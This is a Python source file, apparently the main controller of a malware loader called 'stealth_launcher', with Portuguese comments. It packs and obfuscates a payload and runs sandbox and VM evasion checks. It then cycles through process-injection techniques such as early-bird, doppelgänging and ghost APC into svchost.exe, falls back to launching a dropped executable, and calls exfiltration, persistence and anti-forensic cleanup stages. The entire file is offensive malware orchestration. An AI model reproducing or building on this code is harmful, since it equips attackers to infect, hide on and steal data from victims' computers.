import os
import shutil
import logging
import tempfile
import traceback
from pathlib import Path

from stealth_launcher.exceptions import PackingError, StageError
from stealth_launcher.config import verify_signature
from stealth_launcher.payload_packager import pack_payload
from stealth_launcher.stages.payload_integrity import self_integrity_check
from stealth_launcher.advanced.reflective_loader import load_pe_reflective
from stealth_launcher.advanced.syscall_stubs import (
    open_process_nt,
    nt_map_view_of_section,
    write_memory_nt,
    nt_unmap_view_of_section,
    create_remote_thread_nt,
    create_process_nt,
    queue_user_apc_nt,
    suspend_thread_nt,
    resume_thread_nt
)
from stealth_launcher.advanced.apc_injection import apc_inject
from stealth_launcher.advanced.evasion_techniques import (
    anti_hypervisor,
    detect_sandbox,
    detect_vm,
    detect_hypervisor_timing_gpu,
    fingerprint_hardware_unique,
    evasion_container
)
from stealth_launcher.advanced.injection_techniques import (
    early_bird_injection,
    kernel_assisted_reflective_loader,
    process_doppelgaenging_complete,
    dynamic_syscall_resolution,
    ghost_apc_injection,
    hop_scotch_injection
)
from stealth_launcher.stages.communication import communication_exfiltration_stage
from stealth_launcher.stages.persistence import persistence_stage
from stealth_launcher.stages.cleanup import cleanup_stage

# Default target for injection
DEFAULT_TARGET = "svchost.exe"


class PayloadExecutor:
    def __init__(self, cfg):
        self.cfg = cfg
        self.payload_path: Path = cfg.payload_path
        self.target_process = getattr(cfg, 'target_process', DEFAULT_TARGET)

    def execute(self):
        try:
            # 1. Verificação de assinatura
            if self.cfg.signature_hash and not verify_signature(self.payload_path, self.cfg.signature_hash):
                raise PackingError("Falha na verificação de assinatura do payload")

            # 2. Empacotamento/ofuscação
            packed_path = self.pack_payload()

            # 3. Técnicas de evasão
            self.evasion_techniques()

            # 4. Verificação de integridade do payload
            self_integrity_check(packed_path, self.cfg.signature_hash or "")

            # 5. Tentar injeções avançadas com fallback
            if not self.try_advanced_injections(packed_path):
                self.create_temp_exe(packed_path)

            # 6. Comunicação e exfiltração
            communication_exfiltration_stage()

            # 7. Persistência fora-da-curva
            persistence_stage(self.cfg)


            # 8. Anti-forense e autolimpeza ultra-rápida
            cleanup_stage()

        except StageError as se:
            logging.error(f"StageError: {se}")
            traceback.print_exc()
        except Exception as e:
            logging.error(f"Erro geral ao executar payload: {e}")
            traceback.print_exc()

    def pack_payload(self) -> Path:
        try:
            packed = pack_payload(str(self.payload_path), obfuscation=self.cfg.obfuscate)
            logging.info(f"[PayloadExecution] Payload empacotado em {packed}")
            return Path(packed)
        except Exception as e:
            raise PackingError(f"Erro ao empacotar payload: {e}")

    def evasion_techniques(self):
        try:
            detect_hypervisor_timing_gpu()
            fingerprint_hardware_unique()
            evasion_container()
            detect_sandbox()
            detect_vm()
        except Exception as e:
            logging.warning(f"[PayloadExecution] Técnicas de evasão falharam: {e}")

    def try_advanced_injections(self, packed_path: Path) -> bool:
        # Early-Bird Injection
        try:
            early_bird_injection(packed_path, self.target_process)
            return True
        except Exception as e:
            logging.warning(f"[Injection] Early-Bird falhou: {e}")
        # Kernel-Assisted Reflective Loader
        try:
            kernel_assisted_reflective_loader(packed_path, self.target_process)
            return True
        except Exception as e:
            logging.warning(f"[Injection] Kernel-Assisted falhou: {e}")
        # Process Doppelganging
        try:
            process_doppelgaenging_complete(packed_path, self.target_process)
            return True
        except Exception as e:
            logging.warning(f"[Injection] Doppelganging falhou: {e}")
        # Dynamic Syscall Resolution
        try:
            dynamic_syscall_resolution()
            return True
        except Exception as e:
            logging.warning(f"[Injection] Dynamic Syscall falhou: {e}")
        # Ghost APC Injection
        try:
            ghost_apc_injection(packed_path, self.target_process)
            return True
        except Exception as e:
            logging.warning(f"[Injection] Ghost APC falhou: {e}")
        # Hop-Scotch Injection
        try:
            hop_scotch_injection(packed_path, self.target_process)
            return True
        except Exception as e:
            logging.warning(f"[Injection] Hop-Scotch falhou: {e}")
        return False

    def create_temp_exe(self, packed_path: Path):
        try:
            logging.info("[PayloadExecution] Fallback: executável temporário")
            temp_dir = Path(tempfile.gettempdir())
            exe_path = temp_dir / (packed_path.stem + ".exe")
            shutil.copy2(packed_path, exe_path)
            os.startfile(str(exe_path))
            logging.info(f"[PayloadExecution] Executável iniciado: {exe_path}")
        except Exception as e:
            raise StageError(f"Falha no fallback executável temporário: {e}")


def main():
    try:
        from stealth_launcher.config import Config
        cfg = Config(
            mutex_name="Global\\MyApp",
            payload_path=Path('path/to/payload.exe'),
            obfuscate=True,
            log_file=Path(tempfile.gettempdir()) / 'stealth.log',
            signature_hash='hash_signature'
        )
        cfg.target_process = DEFAULT_TARGET
        executor = PayloadExecutor(cfg)
        executor.execute()
    except Exception as e:
        logging.error(f"Erro no main: {e}")
        traceback.print_exc()


if __name__ == '__main__':
    main()
